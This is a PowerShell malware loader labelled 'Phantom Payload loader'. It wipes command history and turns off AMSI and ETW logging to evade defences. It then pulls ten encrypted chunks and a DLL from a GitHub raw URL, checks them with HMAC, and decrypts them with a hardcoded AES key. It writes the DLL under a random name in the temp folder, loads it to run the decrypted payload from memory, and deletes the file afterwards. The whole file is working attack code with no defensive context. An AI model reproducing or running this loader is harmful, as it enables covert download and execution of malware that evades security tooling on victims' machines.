#  <~ Phantom Payload loader (variant A â€” temp DLL ~5s lifetime). ~>
$ErrorActionPreference = 'SilentlyContinue'

# -- 1. Clear PSReadLine history --
try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    $hp = (Get-PSReadLineOption).HistorySavePath
    if ($hp -and (Test-Path $hp)) { Clear-Content $hp -Force }
} catch {}

# -- 2. AMSI bypass --
try {
    $am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($am) {
        $f = $am.GetField('amsiInitFailed','NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch {}

# -- 3. ETW bypass --
try {
    $et = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($et) {
        $ef = $et.GetField('etwProvider','NonPublic,Static')
        if ($ef) {
            $pr = $ef.GetValue($null)
            $en = $pr.GetType().GetField('m_enabled','NonPublic,Instance')
            if ($en) { $en.SetValue($pr, 0) }
        }
    }
} catch {}

# -- 4. Config --
$BaseUrl    = 'https://raw.githubusercontent.com/negadofoxzz-art/cfg-sync/refs/heads/main/'
$ChunkCount = 10
$KeyHex     = '6db02580be9a4fdfa1bd8da241b41f03b2cd2e36edf5ebef2feedeabb02a843c'
$MacUrl     = $BaseUrl + 'mac.b64'
$SlUrl      = $BaseUrl + 'sl.b64'

function HexBytes([string]$h) {
    $r = New-Object byte[] ($h.Length / 2)
    for ($i = 0; $i -lt $h.Length; $i += 2) {
        $r[$i / 2] = [Convert]::ToByte($h.Substring($i, 2), 16)
    }
    return ,$r
}

# -- 5. Fetch chunks + reassemble --
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
$envParts = @()
$totalSize = 0
for ($i = 1; $i -le $ChunkCount; $i++) {
    $name = 'cfg-{0:D2}.txt' -f $i
    $b64 = $wc.DownloadString($BaseUrl + $name)
    $part = [Convert]::FromBase64String($b64.Trim())
    $envParts += ,$part
    $totalSize += $part.Length
}
$envelope = New-Object byte[] $totalSize
$off = 0
foreach ($p in $envParts) {
    [Buffer]::BlockCopy($p, 0, $envelope, $off, $p.Length)
    $off += $p.Length
}

$macB64 = $wc.DownloadString($MacUrl)
$macRef = [Convert]::FromBase64String($macB64.Trim())
$slB64  = $wc.DownloadString($SlUrl)
$slDll  = [Convert]::FromBase64String($slB64.Trim())
$wc.Dispose()

# -- 6. Split envelope --
$iv = New-Object byte[] 16
$ct = New-Object byte[] ($envelope.Length - 16)
[Buffer]::BlockCopy($envelope, 0,  $iv, 0, 16)
[Buffer]::BlockCopy($envelope, 16, $ct, 0, $ct.Length)

# -- 7. HMAC verify --
$key = HexBytes $KeyHex
$hm  = [System.Security.Cryptography.HMACSHA256]::new($key)
$macCur = $hm.ComputeHash($ct)
$hm.Dispose()
$ok = $true
if ($macCur.Length -ne $macRef.Length) { $ok = $false }
else {
    $xor = 0
    for ($i = 0; $i -lt $macCur.Length; $i++) { $xor = $xor -bor ($macCur[$i] -bxor $macRef[$i]) }
    if ($xor -ne 0) { $ok = $false }
}
if (-not $ok) { return }

# -- 8. AES-256-CBC decrypt --
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV  = $iv
$dec = $aes.CreateDecryptor()
$ms  = New-Object System.IO.MemoryStream
$cs  = New-Object System.Security.Cryptography.CryptoStream($ms, $dec, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($ct, 0, $ct.Length)
$cs.FlushFinalBlock()
$fivem = $ms.ToArray()
$cs.Dispose(); $ms.Dispose(); $dec.Dispose(); $aes.Dispose()

[Array]::Clear($key, 0, $key.Length)
[Array]::Clear($ct,  0, $ct.Length)
[Array]::Clear($iv,  0, $iv.Length)
$envelope = $null; $envParts = $null

# -- 9. Write sl.dll to temp with random name --
$ext  = [IO.Path]::GetRandomFileName() -replace '\..*$',''
$dllPath = [IO.Path]::Combine([IO.Path]::GetTempPath(), "ms$ext.dll")
[IO.File]::WriteAllBytes($dllPath, $slDll)
[Array]::Clear($slDll, 0, $slDll.Length)

# -- 10. P/Invoke bootstrap (minimal â€” just LoadLibrary + GetProcAddress + FreeLibrary) --
Add-Type -Name PL -Namespace Ph -MemberDefinition @"
    [System.Runtime.InteropServices.DllImport("kernel32", CharSet=System.Runtime.InteropServices.CharSet.Unicode)]
    public static extern System.IntPtr LoadLibraryW(string lpFileName);
    [System.Runtime.InteropServices.DllImport("kernel32", CharSet=System.Runtime.InteropServices.CharSet.Ansi)]
    public static extern System.IntPtr GetProcAddress(System.IntPtr hModule, string lpProcName);
    [System.Runtime.InteropServices.DllImport("kernel32")]
    public static extern bool FreeLibrary(System.IntPtr hModule);
"@

# -- 11. Delegate type for RunLaunchFromMemory(IntPtr bytes, int len) â†’ int --
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[UnmanagedFunctionPointer(CallingConvention.Winapi)]
public delegate int RunLaunchDelegate(IntPtr bytes, int len);
"@

$h = [Ph.PL]::LoadLibraryW($dllPath)
if ($h -eq [IntPtr]::Zero) {
    Remove-Item $dllPath -Force -EA Ignore
    return
}
$fn = [Ph.PL]::GetProcAddress($h, 'RunLaunchFromMemory')
if ($fn -eq [IntPtr]::Zero) {
    [void][Ph.PL]::FreeLibrary($h)
    Remove-Item $dllPath -Force -EA Ignore
    return
}

$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fn, [RunLaunchDelegate])

$pin = [System.Runtime.InteropServices.GCHandle]::Alloc($fivem, [System.Runtime.InteropServices.GCHandleType]::Pinned)
try {
    [void]$del.Invoke($pin.AddrOfPinnedObject(), $fivem.Length)
} finally {
    $pin.Free()
    [Array]::Clear($fivem, 0, $fivem.Length)
    [void][Ph.PL]::FreeLibrary($h)
    Remove-Item $dllPath -Force -EA Ignore
}
